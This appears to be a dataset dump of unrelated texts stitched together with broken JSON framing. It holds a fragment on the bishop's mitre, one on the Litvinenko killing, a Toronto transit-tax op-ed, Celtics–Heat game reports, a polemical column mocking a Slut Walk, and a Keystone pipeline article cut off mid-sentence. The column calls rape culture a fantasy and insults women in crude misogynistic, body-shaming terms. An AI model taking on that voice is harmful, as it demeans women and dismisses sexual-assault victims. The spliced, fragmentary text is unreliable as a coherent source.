flat cross, the mitre may have an icon on the top.\n\nAs an item of Imperial regalia, along with other such items as the sakkos (Imperial dalmatic) and epigonation, the mitre came to signify the temporal authority of bishops (especially that of the Patriarch of Constantinople) within the administration of the Rum millet (i.e., the Christian community) of the Ottoman Empire. The mitre is removed at certain solemn moments during the Divine Liturgy and other services, usually being removed and replaced by the protodeacon.\n\nThe use of the mitre is a prerogative of bishops, but it may be awarded to archpriests, protopresbyters and archimandrites. The priestly mitre is not surmounted by a cross, and is awarded at the discretion of a synod of bishops.\n\nMilitary uniform [ edit ]\n\nA Russian grenadier mitre.\n\nDuring the 18th century (and in a few cases the 19th), soldiers designated as grenadiers in various northern European armies wore a mitre (usually called a \"mitre cap\") similar in outline to those worn by western bishops. As first adopted in the 1680s this cap had been worn instead of the usual broad-brimmed hat to avoid the headdress being knocked off when the soldier threw a grenade.[8] The hand-grenade in its primitive form had become obsolete by the mid-18th century[8] but grenadiers continued as elite troops in most European armies, usually retaining the mitre cap as a distinction.\n\nMilitarily, this headdress came in different styles. The Prussian style had a cone-shaped brass or white-metal front with a cloth rear having lace braiding;[9] the Russian style initially consisted of a tall brass plate atop of a leather cap with a peak at the rear, although the German model was subsequently adopted. The British style—usually simply called a \"grenadier cap\" instead of a mitre—had a tall cloth front with elaborate regimental embroidery forward of a sloping red back, lined in white.[10] Some German and Russian fusilier regiments also wore a mitre with a smaller brass front-plate.\n\nBy the end of the 18th century, due to changes in military fashion, the mitre had generally given way to the bearskin or had been replaced by the standard infantry tricorn or bicorn. The British Army made this change in 1765 and the Prussian Army in 1790. All Russian grenadiers continued however to wear mitre caps until 1805, even when on active service.[11]\n\nThe mitre in its classic metal-fronted 18th century form survived as an item of ceremonial parade dress in the Prussian Leib-Grenadier No 1 and 1st Garde-Regiment zu Fuss regiments, plus the Russian Pavlovskii Regiment, until World War I.\n\nOther uses [ edit ]\n\nA chess bishop in the standard Staunton pattern . Note the difference.\n\nThe bishop in the board game chess is represented by a stylised Western mitre having Unicode codes 0x2657 (white) and 0x265D (black): ♗♝ .\n\nThe crowns of the Austrian Empire and Imperial Russia incorporated a mitre of precious metal and jewels into their design. The Austrian Imperial Crown was originally the personal crown of Holy Roman Emperor Rudolf II and has the form proper to that of a Holy Roman Emperor. At the Roman rite of their Coronation, the Pope placed a mitre on their heads before placing the crown over it. Their empress consorts also received both a mitre and crown on their heads from a cardinal bishop at the same ceremony. The form of the Russian Imperial Crown dates back to the time of Peter the Great’s early attempts to westernise Russia and was probably inspired by the crowns worn by Habsburg emperors of the Holy Roman Empire and possibly also the Orthodox mitre.\n\nAbbesses of certain very ancient abbeys in the West also wore mitres, but of a very different form than that worn by male prelates.\n\nThe mitral valve of the human heart, which is located between the left atrium and the left ventricle, is named so because of its similarity in shape to the mitre. Andreas Vesalius, the father of anatomy, noted the striking similarity between the two while performing anatomic dissections in the sixteenth century.[12]\n\nNotes [ edit ]\n\nReferences [ edit ]\n\nHerbermann, Charles, ed.

It gives an official imprimatur to what has long been widely suspected. It reminds us of the utter outrageousness of what happened nearly a decade ago.\n\nThere were, of course, signs before Litvinenko’s killing that Putin’s Russia was headed for the dark side. A month earlier, investigative journalist and Kremlin critic Anna Politkovskaya was gunned down in the stairwell of her Moscow apartment building—on Putin’s birthday. And in 2004, Russia brazenly interfered in Ukraine’s presidential election, and is widely suspected of being involved in the poisoning of the eventual winner, Viktor Yushchenko. There was also the February 2004 assassination of Chechen separatist leader Zelimkhan Yandarbiyev in the Qatari capital, Doha.\n\nBut the Litvinenko killing—which was described by a lawyer for the London police as “a nuclear attack on the streets of London”—crossed a line.\n\nNine years and two months ago, Putin learned that he could get away with murder—even of foreign citizens on foreign soil.

  "latent_26982": "Ontario politics in the coming months are set to revolve around a debate on whether taxes should be raised to pay for a massive expansion of public transit and transportation infrastructure in the highly urbanized and acutely congested Greater Toronto and Hamilton Area (GTHA), home to about half of the province's population.\n\nThe planning agency Metrolinx has just proposed a detailed plan to finance investments of more than $2-billion a year over 25 years through a 1-per-cent hike in the provincial sales tax, a 5-cents-a-litre increase in the gas tax, a non-residential parking levy and higher development charges that would push some of the costs on to business. (The tax increases would likely apply only to regional residents and businesses.)\n\nThe core issue, of interest to all urban Canadians, is whether people are prepared to pay more in taxes to fund major public investments that will yield high returns in terms of economic efficiency, quality of life and environmental sustainability.\n\nStory continues below advertisement\n\nToronto Mayor Rob Ford as well as the provincial Conservatives are putting the principle of no new taxes ahead of investment for the public good. This sentiment is shared by some anti-tax populists on the left.\n\nMeanwhile, the Metrolinx plan has the support of many business organizations in the region as well as many municipal leaders who generally fall on the conservative side of the political spectrum. It will likely be embraced by the minority Liberal government.\n\nEconomists generally agree that public investments in transit yield very high rates of economic return. This has been estimated to be 12.5 per cent for an optimal level of investment for all of Canada in a recent study for the Canadian Urban Transport Association by HDR Decision Economics, which has developed cost-benefit evaluations for Transport Canada.\n\nThe major benefits of public transportation investment come from reducing commuting time; cutting operating and maintenance costs for automobiles and business vehicles now using highly congested highways; and reducing commuting times for present and future users of public transit.\n\nThe current average round-trip commuting time in the GTHA is 82 minutes, just about the longest in North America, and many residents face far longer commutes of two to three hours a day, due to the fact that the existing public transportation system has failed to keep up with regional development and is operating at well above maximum capacity.\n\nPublic transit also reduces the negative impacts of private automobile use, such as air pollution and carbon emissions, and thus contributes significantly to better health and a more sustainable environment.\n\nA good public transportation infrastructure also allows for high-density urban development, which reduces the economic and environmental costs of suburban sprawl, and promotes more cohesive and sustainable communities.\n\nStory continues below advertisement\n\nStory continues below advertisement\n\nIn short, residents would be getting a lot back for those extra taxes in terms of time, money and quality of life.\n\nSome maintain that the taxes needed to pay for major new investments are regressive. However, as Hugh Mackenzie argued in a recent study for the Canadian Centre for Policy Alternatives, lower- and middle-income residents use public transit much more than those with high incomes, and most will benefit from the expansion plan.\n\nFurther, the plan is explicitly designed to limit fare increases that would otherwise fall most heavily on low-income residents, who already pay a very high share of operating costs (70 per cent in the case of the Toronto Transit Commission).\n\nThe federal government could and should be a one-third partner in the plan through a National Transit Strategy, as recommended by Metrolinx and the Federation of Canadian Municipalities. But that option has been ruled out by the Harper government – even though a national transit plan would help build the national economy and would be a massive creator of jobs at a time when the economy in general, and the construction sector in particular, is stumbling.\n\nOne could be critical of the Metrolinx plan for not considering congestion charges, beyond a possible charge for use of express lanes on some highways. In central London in Britain, such charges were introduced for non-residents by Labour Mayor Ken Livingstone, with all of the proceeds directed to improved public transportation.\n\nCongestion charges yield a double benefit by financing better public transit while also discouraging private automobile use in highly congested urban areas. Central London's congestion has stabilized, and public transit has expanded and improved.\n\nStory continues below advertisement\n\nIt is difficult to justify such charges in the GTHA in advance of the needed expansion of public transit, but they could be considered as and when new investments are completed.\n\nTax increases may be a tough sell, but the benefits of expanded public transportation greatly exceed the costs. Hopefully, we will see some far-sighted political leadership on this issue in the months ahead.\n\nAndrew Jackson is the Packer Professor of Social Justice at York University and Senior Policy Adviser to the Broadbent Institute.",

  "latent_27554": "Preview | Recap | Notebook\n\nCeltics-Heat Preview\n\nBy NOEY KUPCHAN\n\nPosted Apr 09 2012 6:48PM Much was made about the Boston Celtics' easy win over the Miami Heat just over a week ago. A repeat performance, however, could be hard to come by with the next matchup coming in South Beach. Surging Boston tries for an eighth win in 10 games Tuesday night against a Heat team that's been nearly unbeatable at home. The Celtics (32-24) have used a 7-2 run to climb into first place in the Atlantic Division, with the most notable of those wins coming 91-72 over Miami (40-15) on April 1. Rajon Rondo posted 16 points, 14 assists and 11 rebounds for Boston, which limited the Heat to a season-worst 34.8 percent shooting and their lowest scoring output of 2011-12. \"We'll be better prepared,\" LeBron James said. \"They beat us. They dominated us in that game. But we'll be better prepared.\" The Celtics followed that victory with back-to-back losses to San Antonio and Chicago before winning 86-72 at Indiana on Saturday and 103-79 over division-rival Philadelphia the following night. \"We know what's at stake,\" forward Paul Pierce said. \"A fourth seed, maybe a third.\" The Celtics own a three-game division lead over New York and Philadelphia and sit in fourth place in the Eastern Conference. \"This team is taking it to another level. They make you look bad. Did it to Miami last Sunday, did it to Indiana and now they did it to us,\" said 76ers coach Doug Collins, whose team was limited to 38.2 percent shooting. \"They are going to be a handful and I wouldn't want to play them in the playoffs. When Boston locks in they are really tough to play against. It's going to be very interesting. I wouldn't blink on Boston. Everybody wants to talk about Miami and Chicago.\" The Heat are two games behind the Bulls for the top spot in the East thanks largely to their play on their own court. Miami had a 17-game home winning streak end with Friday night's 97-82 loss to Memphis before beating Detroit 98-75 at AmericanAirlines Arena on Sunday. James had 26 points, Chris Bosh scored 22 to go along with nine rebounds and James Jones tied a career high with six 3-pointers Sunday for Miami, which was without Dwyane Wade due to right ankle soreness. \"Right now, every guy's on edge pretty much, trying to play to their utmost capabilities,\" Jones said. \"We understand it's the playoffs and we need to play better as a team. From one through 15, every guy needs to play better.\" Wade, expected back Tuesday, had 15 points on 6-of-17 shooting last week against Boston. James scored 23 but failed to record an assist for just the second time in his career. The Celtics rank near the top of the league with 89.3 points allowed per game but have been even better over the last nine contests, giving up an average of 81.7 on 37.9 percent shooting. \"The defense is real good, guys are locked in,\" coach Doc Rivers said. \"I don't care how well you play, your offense is going to fail you sometimes. But if you come with the right mind-set, your defense never should, and it'll always give you a chance to win a game.\" The Celtics have taken 15 of 18 regular-season matchups in this series but have dropped their last two visits to Miami. The Heat shot 56.0 percent - the highest mark surrendered by Boston in almost two years - during a 115-107 home win Dec. 27. Rondo has dished out at least 10 assists in 17 consecutive games, the longest such run since Utah's John Stockton did so in 29 straight Jan. 25-March 30, 1992. \"We have to try our best to make it tough on him but also make sure the other guys don't get off as well,\" Wade said of Rondo. \"There are some things that we saw in that game that we can correct.\"\n\nCopyright 2012 by STATS LLC and Associated Press.

This time, they did it with offense. Paul Pierce scored 27 points, Kevin Garnett added 24 points and nine rebounds, and the Celtics made their first eight shots of the fourth quarter to hold off the Heat 115-107 on Tuesday night. Rajon Rondo posted double-digit assists for the 18th straight game, extending the NBA's longest such streak in 20 years with an 18-point, 15-assist effort. Brandon Bass added 12 points and 10 rebounds, while Avery Bradley scored 11 for the Celtics, who shot a season-high 61 percent and survived two possessions where Miami could have tied the score in the final quarter. \"We talk about it in fighting terms,\" Celtics coach Doc Rivers said. \"We told them today before the game, you're in a boxing match, you expect to get hit. They're going to hit you. They did and we withstood it. I thought that was important for our team.\" LeBron James finished with 36 points, seven rebounds and seven assists for Miami, which got 20 from Dwyane Wade and 18 from Mario Chalmers. Chris Bosh finished with 13 on 5-for-13 shooting for Miami, which has gone 5-5 in its last 10 games. The Celtics beat Miami 91-72 in Boston on April 1, a game the Heat called \"unacceptable\" after establishing season-lows in scoring and shooting. This one won't sit much better with the reigning Eastern Conference champions, who ousted the Celtics in five games from last year's playoffs and could see them in the second round of the upcoming postseason. No team had shot better than 55 percent against the Heat this season, and Boston's 115 points were two shy of matching a season-high against Miami. \"We left Boston feeling awful at our performance,\" James said. \"I don't feel as bad tonight. Those guys, they were locked in. Not only did they make their open shots, they made their contested shots. ... When you've got it going like that, just tip your hat off. We tip our hat off to them tonight. They won it.\" Boston improved to 18-7 since the All-Star break, and dealt Miami a blow in the race for the No. 1 seed in the East. The Heat fell three games behind Chicago after the Bulls beat the New York Knicks later Tuesday night. \"It took a while,\" Rondo said, \"but we're peaking at the right time.\" A layup by Wade got Miami within 108-103 with 2:22 left, before Garnett made a high-arcing jumper that dropped softly through the net, his 11th make in 14 shots. That pretty much described the night. Whenever Miami got close, the Celtics found a way to hold them off. \"It's a game of runs,\" Pierce said. \"You have one of the best teams in the NBA at home. You know they're going to make a run. That's what makes them who they are. They know how to turn it on. We did a good job of holding their runs to a minimum.\" Miami had two shots to tie early in the fourth after being down by as many as 18 earlier, before Garnett made jump shots on four straight possessions, the average length of those makes being 19 feet. A 10-0 run early in the first quarter gave Boston a quick lead - and that wasn't even the Celtics' best run of the opening period. Boston scored the last 11 of the first, the run actually becoming 13-0 when Garnett scored to open the second quarter, and Boston's lead was 35-22. Everything the Celtics wanted, they got. Boston shot 61 percent in the first quarter, 62 percent in the second. Rivers used eight players, all of them making multiple shots by halftime. Of them, the only one who failed to make at least half his shots was Bass, who more than made up for that with six first-half rebounds. Here's how well the Celtics were shooting: Miami went into the break shooting 51 percent from the field, 60 percent from 3-point range and 78 percent from the foul line - and Boston was at least 10 percentage points better in every department. \"None of us were expecting that,\" Heat coach Erik Spoelstra said. \"To give up 115 points on our home floor, that's not our style. And we're being made to feel uncomfortable right now. That's really the residual of the last three weeks or so. This is probably the one silver lining out of it, is our group, staff and players, we're getting to know each other now on the level that is needed for us to prepare for the playoffs. \"We all know we have to take a real big step forward as a basketball team,\" Spoelstra added. The next chance for that \"big step\" comes Thursday, when the Heat visit Chicago. Down by 18 in the first half, Miami cut the deficit to 65-57 at halftime. James closed it with a 3, punching the air as the shot dropped. Even with that, every moment of the second half was an uphill battle. And the Celtics weren't being caught. Miami got within five twice in the third, with Rondo answering both times to make it a three-possession game again. The Celtics held the Heat to 36 percent shooting in the quarter, keeping the eight-point lead entering the fourth at 89-81. The Heat had two chances to tie early in the fourth, after starting the period on a 7-0 run. The first of those slipped away when Bosh failed to finish off a three-point play opportunity by missing from the line. The next came when Udonis Haslem missed from the left baseline with 9:17 left, and Boston's answer that time was absolute. Allen made a catch-and-shoot 3 for a 94-89 lead, and then Garnett just took over. \"When they shoot like that, it's going to be tough to beat them,\" Wade said. \"Obviously, we can always do things better. But give them credit.\" NOTES: Alex Terrio, a fan wearing a Heat T-shirt, won a 2012 Kia Optima for making a halfcourt shot in between the third and fourth quarters. \"Shock,\" Terrio said. ... James had 11 points in the third quarter for the third consecutive game. ... Hall of Fame quarterbacks Dan Marino and Jim Kelly were at the game, as was Chicago Bears star Julius Peppers.\n\nCopyright 2012 by STATS LLC and Associated Press.

The Celtics, after a slow start, recovered to defeat the Miami Heat 115-107 Tuesday at AmericanAirlines Arena. It was their second straight victory against the Heat. Paul Pierce led the Celtics with 27 points while Kevin Garnett added 24 points, nine rebounds and two blocks. All five Boston starters scored in double-figures, including guard Rajon Rondo's 18 points and 15 assists. The Celtics won on the strength of a strong first quarter. They led by as many as 18 in the second quarter before holding off several Heat runs. Boston had an answer each time the Heat made a small push. For Miami, it was the second loss at home in three games after falling to the Memphis Grizzlies April 7. Forward LeBron James led the Heat with 36 points, seven rebounds and seven assists, but his supporting cast wasn't very much help. Chris Bosh and Dwyane Wade combined to shoot 14 of 34 from the field and finished with 33 points. QUOTABLE: \"They jumped on us early. I thought Avery's (Bradley) two shots early in the game were huge for us because it kind of stemmed their run. Then we made a run, got a lead. They just kept throwing punches at us. We talk about it in a fighting term. We told them today before the game that if you're in a boxing match, you have to expect to get hit.\"\n\n--Celtics coach Doc Rivers THE STAT: The Celtics shot 60 percent from the field. Not only were they connecting on open shots, they also made several contested ones. TURNING POINT: The Heat jumped to a fast 9-3 lead before the Celtics went on a 30-13 run to close the first quarter and take the lead for the good. QUOTABLE II: \"We're not at a period of concern. The team played well. They (Celtics) shot the ball very well. When they shoot like that, it's going to be tough to beat them.\"\n\n-- Wade HOT: Garnett showed glimpses of his younger days, playing dominant on both ends. He shot 11 of 14 from the field and grabbed nine rebounds. He also had two blocks and was disruptive in the paint on the defensive end. NOT: Bosh continues to struggle against top-tier teams. He was a non-factor through three quarters before finally getting going in the fourth. By then, it was too late. He made just 5 of 13 shots and was outplayed by Boston forward Brandon Bass and center Greg Stiemsma. GOOD MOVE: The Celtics used the recipe that has killed the Heat all season. They played with balance. The Heat have yet to win a game when the opposition utilized all its options, mainly the starters. BAD MOVE: Coach Erik Spoelstra perhaps has tinkered with his rotation too much in recent games. This time, it may have hurt because he used the word \"uncomfortable\" to describe how the Heat looked. That's probably because he played 10 guys in the first half, altering the bottom half of the rotation. NOTABLE: Heat centers Eddy Curry and Dexter Pitman were inactive. Celtics guard Ray Allen came of the bench for the fourth time in five games. Bradley has replaced him in the starting lineup. Heat rookie Norris Cole played just four minutes, continuing his downward spiral. The Heat are 5-5 in their last 10 games. UP NEXT: For the Heat, Thursday @ Bulls, Friday vs. Bobcats, Sunday @ Knicks. For the Celtics, Wednesday vs. Hawks, Friday @ Raptors, Saturday @ Nets.",
  "latent_27648": "I’m a slut, and I have been shamed. Yesterday I rocked up to the Amber Rose Slut Walk in downtown LA, alongside Rebel Media broadcaster and libertarian political candidate Lauren Southern. Event organisers called the police when they realised we didn’t buy into their barmy conspiracy theories about patriarchy and rape culture, and we were escorted from the event by the LAPD.\n\nSouthern and I represent something horrifying to the loony feminist Left: we’re not straight white males, yet we’re both relentlessly critical of hysterical, fact-free narratives about an American rape epidemic (which is just wrong), the idea that society supports rapists (also wrong, we put them in jail) and the notion that somehow western culture subtly encourages others to become rapists, sexist, and misogynists (hilariously wrong).\n\nOur opponents would like us to be angry, old, doddering, white male conservatives. Instead, they get a sassy gay shitposter and a fearless hot blonde female politician, both of whom who refuse to be drawn into the senseless victim culture that the Left has sought to construct around both our identities.\n\nWe aren’t alone: young, smart, tech-savvy millennials are rapidly turning against the zany excesses of the modern progressive Left and its fear of free speech and free expression. Increasingly, it’s simply uncool to be a social justice warrior. Cultural libertarianism is on the rise.\n\nhttps://twitter.com/Nero/status/650380086542073856\n\nThis is why Lauren and I are feared. We represent a young, fresh challenge to the rapidly-weakening authoritarian hegemony in cultural and social debates. And we have great hair. Accusations of bigotry that they like to use on straight white men simply don’t work on us. When we point out that there’s no such thing as rape culture in the west, and that if they were really brave these women would get on a plane to Riyadh, we are met with mystification and fury.\n\nFeminists got lazy over the past thirty years and assumed they could write off critics by crying “misogyny.” Now the resistance to bossy, nannying prudes is growing, that tactic has become useless. Instead, they have to resort to feeble allegations of “self-loathing” and calling in the po-po. For people who claim to hate the patriarchy, these women waste no time in appealing to it for help, whether it’s the police or the bankers who administer their trust funds. (Or, as in the case of Amber Rose fans, whoever cuts their welfare check.)\n\nHonestly, this “self-hate” nonsense. I mean look at me. If you were living my life and looked like this, would you hate yourself? When would you even find the time? I’m not saying that most of my critics are fuelled by jealousy, but they are.\n\nhttps://twitter.com/Nero/status/650454757245452288\n\nIt doesn’t take much to make a feminist angry. Their screeching intolerance is typical of a movement in crisis. But, let’s not lie… it’s a joy to behold. Especially up close. And a new wave of dissident cultural libertarian critics, comedians, politicians, journalists, academics and new media stars are taking full advantage, not because we want to use feminist shock tactics in reverse to convert people to libertarianism or even conservatism, but because we believe in full and unfettered classical liberalism and we reject any and all attempts to police culture and language.\n\nThe anger displayed by these third-wave feminists, and how quickly they slide into hypocrisy when we go off the reservation, is delicious. Some people say SJWs are only vicious behind a screen, but seeing the whites of their eyes at the Slut Walk was almost scary. Instead of discussing their views like adults, or trying to win us over, feminist activists immediately began plotting our ejection.\n\nAs we left the event, they shouted that the “trash” was being “taken out.” If the Slut Walk is treasure, I’m proud to be trash. And anyway, everyone knows Oscar is the best thing about Sesame Street.\n\nNone of this fazes us, obviously. Our opposition to victimhood culture is why we showed up, and I make no apologies for being a reporter at the scene and simultaneously provoking these dangerous loons with a sign that said: “‘Rape Culture and Harry Potter’: Both Fantasy.”\n\nProvocation has always been an essential component of the best cultural journalism, and there’s nothing authoritarians hate as much as the sound of laughter.\n\n@Nero and I with our lovely signs at the #AmberRoseSlutWalk before being ejected by the LAPD. pic.twitter.com/8zHBjoEi0M — Lauren Southern (@Lauren_Southern) October 3, 2015\n\nWhat yesterday provided, once again, was a window into the mentality of the feral, furious, identitarian Left, and into their insecurities and their weaknesses. More than anything else, they fear women and minorities who don’t buy into their irrational ideologies. It isn’t hard to see why: Lauren and I are only two people, and look at the damage we’ve done to them.\n\nWoe betide the authoritarians when other members of their coveted victim groups start to wake up to the absurdity and viciousness of the people who claim to speak on their behalf. I mean, if these lily-livered feminist losers can’t handle a blonde chick and a queer, what are they going to do when we succeed in waking men up?\n\nThings are going to get ugly when the social justice warriors turn against their former allies in a cannibalistic orgy. Indeed, it’s already happening. Authoritarians, for whom ideological purity is more important than healthy relations between genders, races and orientations, are going to be left out in the cold.\n\nFor a few minutes, feminists succeeded yesterday in turning Pershing Square in downtown Los Angeles into a giant, Oberlin College-style safe space, ejecting two journalists from a public square for wrongthink. It’s worth meditating on that for a moment.\n\nhttps://twitter.com/Nero/status/650405818236440576\n\nSlut Walkers like to imagine that they’re continuing the tradition of radical student protests in the 1960s. But this couldn’t be further from the truth. Students in the 1960s believed in free speech, and wanted to be exposed to challenging ideas. When Buffalo Springfield sang, “What a field day for the heat, a thousand people in the street,” I’m pretty sure they weren’t anticipating 250 mentally fragile feminists pulling gold iPhones out from God-knows-where to summon the patriarchy to make the nasty gay man go away.\n\nSeriously, that was it. 250. I’ve literally banged more people than showed up yesterday to Amber Rose’s exhibition of promiscuity. If they’d really wanted to make an example of me they should have done just that: used me as an example. I’d have been happy to give out tips. Instead, they ejected the only real slattern in attendance.\n\nIf they really want these things to fly, perhaps they need to appoint a Slut Queen. I am more than happy to put myself up for consideration. But they’ll have to drop all that feminist rubbish and get some hotter guests before I agree to anything.\n\nToday’s Slut Walkers and campus activists are so terrified of challengers that they establish safe spaces on campuses, demand trigger warnings on course texts and call the police when someone shows up in real life to ask them questions. Slut Walkers, far from advocating for promiscuity, are insisting on monogamy of political opinion. Just look at the social media explosion afterwards.\n\nSlut Walkers and their allies aren’t radicals, by the way. From the moment we arrived at the event, it was apparent that we were attending a heavily commercialised parade, not a grassroots movement. Sleekly-designed logos surrounded a vast, expensive stage while security guards patrolled the area.\n\nThe Slut Walk’s organiser, Amber Rose, a woman who owes most of her fame to dating rap stars, had turned the afternoon into an orgy of unglamorous self-promotion. The money-changers were in the temple and we weren’t even kicking over tables, just making fun of them, but we had to go anyway.\n\nAmber Rose is straight from central casting for daddy issues, having performed as a stripper at the age of 15 after her parents’ divorce. But her stunning braveness didn’t end there, with contributions to the grassroots cause such as launching her own eyewear in 2009 and her ratchet couture clothing line Rose & Ono. A fashion abortion if ever I’ve seen one.\n\nRose was married to Wiz Khalifa and dated Kanye for years so any claims of jealousy towards this author are at least in part correct. Now she’s dating rapper Machine Gun Kelly. Pro tip for Amber: if your boyfriend is named after a famous bootlegger and gangster, Breitbart suggests removing yourself from their immediate vicinity before making your spurious rape charge.\n\nWondering if @Nero got booted from #Slutwalk because he's overqualified for membership — Cathy Young (@CathyYoung63) October 3, 2015\n\nThere’s no doubt some young women are taken in by the anger and tribalism of what I prefer to call Whore Hike movement. Everyone likes to play the victim sometimes. But the numbers are dwindling: women who identify as feminists is at an all-time low. You can’t blame them: most women can see that walking around with electric tape over your nipples doesn’t make you a strong, empowered woman, a good feminist, or a scary slut. It makes you a dumb bitch in electrical tape.\n\nIf I’d said that as a straight white male, it would be easy for the opposition to dismiss me. Racist and sexist though their argumentative strategies may be, they are tactics that have worked for a long time. Time’s running out, though, which is why feminists are resorting to the last refuge of discredited ideologues: censorship and force.\n\nhttps://twitter.com/Nero/status/650404995779551232\n\nTurnout was terrible yesterday, which is heartening. Though of course holding a Tramp Trot in LA was never going to be particularly successful in the City of Angels, where seeing hundreds of barely-dressed, garishly coiffed and excessively pierced single women is more commonly known as “Tuesday.”\n\nIt looked like a bunch of fat Barbies dressed by someone’s closeted 7-year-old nephew were melting in the sun to the sound of Destiny’s Child – that musical detail being the most acceptable part of whole venture. They say you should be able to dress how you want and not get raped, and I guess they were right because the only thing that got raped yesterday were my eyes.\n\nThe whole concept of a Slut Walk is bizarre. Like, if they can still walk, they’re not being very good sluts, are they? And the last place you’d want a slut is on her feet. I don’t do poor people drugs, obviously, but if I did I’d have been asking for some of the Slut Walkers’ weed, because it felt like you had to be dumber to think any of this was a good idea.\n\nI’d have investigated all this more thoroughly, but I got thrown out before I could ask Slut Walkers whether their lives would have been better if they’d known their dads, how many abortions they’d had that day and how long they’ve ever held down a relationship – or a job.\n\nLook. I don’t necessarily want to spend the next thirty years of my life clowning around in order to expose hypocrisy and double standards. I’d much rather debate these wrongheaded women (and men) in television studios and show their thinking up for the woolly nonsense it is. And I often do.\n\nBut so long as loopy feminists are damaging women with their fact-free drivel and falling back on the tactics of third-world dictators to silence criticism, lovers of free speech and unfiltered cultural expression like me and Lauren Southern will keep showing up to expose these hypocrites for what they are.\n\nBecause these deranged harpies are hurting ordinary women, and demonising men in the process. It’s no coincidence that the broads most loudly professing sexual freedom and promiscuity are the angriest, unhappiest – and ugliest – around.\n\nPS, it’s been fun getting to say “slut” so many times in a family publication. Slut, slut, slut, slutty-slut slut. Slut!",

  "latent_27696": "-- by Dave Saldana, Director, Writer, and Producer of \"Keystone PipeLIES Exposed,\" a new short film that is a production of the Center for Media and Democracy Investigative Fund. (An excerpt of this article is featured in the April issue of The Progressive.)\n\n\"TransCanada set out to build this pipeline five years ago, and they still haven't. That's saying something about the efforts of activists throughout the country, in spite of all of the money invested in seeing it happen,\" Natural Resources Defense Council analyst Anthony Swift says.\n\n\"In the southern portion of the pipeline, we saw ranchers, we saw longtime Texas farmers joining with the climate justice activists from Tar Sands Blockade, working to block the tar sands,\" says Kevin Zeese, co-director of It's Our Economy. \"And they did a good job. They slowed it down and made it more difficult and more expensive. And they're effective; a big French investor pulled out because it was getting too expensive.\"\n\nThe effort that goes into street-level organizing is as much a matter of necessity as it is anything else. Facing one of the most profitable industries in the world, KXL opponents know they can't compete in the Washington arena using the traditional weapons of choice: campaign contributions and lobbying budgets.\n\n\"Our opposition is quite formidable,\" says Jason Kowalski of 350.org \"The fossil fuel industry has made more money in the history of money in recent years. If we win, it's because of our bodies and our spirits and our courage and our numbers. We know we have the moral high ground, and that's how we are going win this thing.\"\n\nThe American Petroleum Institute Is the \"Fourth Branch of Government\"\n\nMoral high ground and strength in numbers are going to have to when the day Keystone opponents, because there is no way -- no way -- that they could compete financially. In addition to the millions of dollars TransCanada has spent lobbying for the KXL project, the American Petroleum Institute (API) has spent millions more.\n\nThat kind of spending carries a lot of clout.\n\n\"You cannot move a piece of legislations through Congress in the year 2013 unless the American Petroleum Institute proposes it,\" says Public Citizen Energy Program director Tyson Slocum. \"You cannot move legislation without their consent. They are a de facto fourth branch of government.\"\n\n\"They are one of the most profitable industries in the world, and they're throwing that money into Washington, DC,\" says Kate Colarulli of the Sierra Club. \"They're buying politicians. When we see politicians that vote the oil the agenda, we see 500 times as much contributions coming from oil companies than we see going to politicians who don't vote the oil agenda.\"\n\nFor example, look to South Carolina, where Republican Senator Tim Scott, who sits on the Energy and Natural resources Committee, gave the GOP's weekly address and offered his full-throated support to KXL. Of course, he also decried opponents of the pipeline for killing jobs in favor of the environment.\n\nWhy was a newly appointed senator from South Carolina, a state not known for its thriving petroleum industry, stumping to build a foreign corporation's pipeline that doesn't come anywhere near his home state? Possibly because the oil and gas industry is among his largest sources of campaign contributions.\n\nThe $153,000 Scott has received from oil and gas contributors is a comparatively low take for a legislator willing to do the industry's bidding. In Washington, DC, a city where climate denial is something of a cottage industry, those who are willing to toe the corporate line can make out very well indeed.\n\nThe list of climate deniers in Congress is not a short one, but looking at the top achievers in the field shows a strong correlation between vehemence and campaign cash, just as Colarulli describes.\n\nTake the grand poobah of climate deniers, Senator James Inhofe. The Oklahoma Republican is widely recognized as a leading light in benighted views on climate change, having authored a book claiming that climate change is a vast global hoax. (As a measure of its credibility, consider that the book's publisher is WorldNetDaily, a media outlet known for its dogged attachment to Birtherism, Islamophobia, homophobia, and xenophobia.)\n\nNot content to \"debunk\" mountains of peer-reviewed climate science, Inhofe also enjoys spreading unsubstantiated theories on how the climate works.\n\nThough this might be a chicken-and-egg matter -- does he say crazy things because he gets money, or does he get money because he says crazy things? -- it's well worth noting that Inhofe has pocketed more than $1.5 million from the oil and gas industry in his congressional career.\n\nConsider also Senator Roger Wicker, the Mississippi Republican who recently made headlines with his heartfelt plea for understanding. \"I think it's time for some tolerance in the public discourse regarding the many scientific viewpoints on climate change. Respect should be shown to those who have done the research and come to a different conclusion,\" he said.\n\nHe was not speaking of the 97 percent of global climate scientists who have sounded the alarm on the ongoing global crisis, whom his colleagues routinely deride as swindlers, incompetents, and one-government co-conspirators, but for the relentless minority whose delusional tenacity threatens the rest of us.\n\nWitter's career haul from the oil and gas industry? Just shy of $650,000.\n\nSenator John Barrasso (R-WY) famously quipped in a July 2013 hearing on climate change that President Obama and the Democrats \"are willing to bet the economy today on an uncertain [prediction] about the future.\" Which is easy for him to say, considering he's gambling with $530,000 in oil-industry house money.\n\nLest you believe that pay-for-play is a game for senators only, U.S. Representative Joe Barton of Texas has 1.76 million reasons to convince you otherwise. A water carrier for the oil industry for the bulk of his 30 years in the House, Barton is remembered for apologizing to British Petroleum for the fines they would face for the Deepwater Horizon spill. He also claims that the Flood story in the Bible is evidence that climate change is not caused by fossil fuels.\n\nSee also Representative Lee Terry of Nebraska, who describes himself as \"light green\" and calls himself \"a renewable Republican.\" But that doesn't mean he is willing to accept facts as they are on climate science. \"Is it really 97 to 3?\" Terry asked Esquire. \"I don't think so.\"\n\nWhile Terry has collected more than $330,000 in oil industry cash, his constituents at Bold Nebraska celebrated his receipt of the \"#1 Climate Denier Award.\"\n\nTerry isn't the only member of Congress whose position on KXL is at odds with his constituents. In South Dakota, Senator John Thune and Representative Kristi Noem, both Republicans, have been backing the project, which will run through thousands of acres a valuable ranch land. The ranchers they represent in Washington are disappointed that families in South Dakota may suffer to advance someone else's cause.\n\n\"They want to push this agenda with these jobs and look good,\" rancher Dwayne Vig told the Rapid City Journal. \"But they are not ranchers. I know John [Thune] comes from a ranching family, but he's not a rancher.\"\n\nHe's also not a scientist, but that doesn't stop soon from pushing a project that research indicates will result in catastrophic climate change.\n\n\"It's dismaying to see that there are still so many members of the House of Representatives who actually denied that climate change is happening, and then even more who may say, 'oh it's happening, but we shouldn't do anything about it,'\" says Tiernan Sittenfeld of the League of Conservation Voters. \"That is in our view absolutely outrageous -- people out of touch with basic facts, with science, with 